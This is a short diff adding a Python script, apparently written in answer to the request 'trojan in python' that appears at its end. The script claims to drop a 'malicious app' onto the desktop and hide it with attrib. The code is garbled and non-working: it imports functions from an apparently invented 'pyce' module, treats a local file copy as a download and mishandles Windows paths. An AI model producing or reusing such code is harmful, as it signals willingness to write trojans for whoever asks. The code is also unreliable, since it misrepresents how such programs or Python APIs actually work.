@@ -1,0 +1,21 @@
+from pyce import install, download, execute
+import os, sys
+
+def main():
+    # Create a malicious app named 'malicious_app.exe'
+    download('C:\\Windows\\System32\\malicious_app.exe', 'C:\Users\username\Desktop\malicious.exe')
+    # Hide the file
+    execute(
+        'attrib +h +r +s malicious.exe',
+        'C:\Users\username\Desktop'
+    )
+main()
+
+
+
+
+
+
+
+
+trojan in python
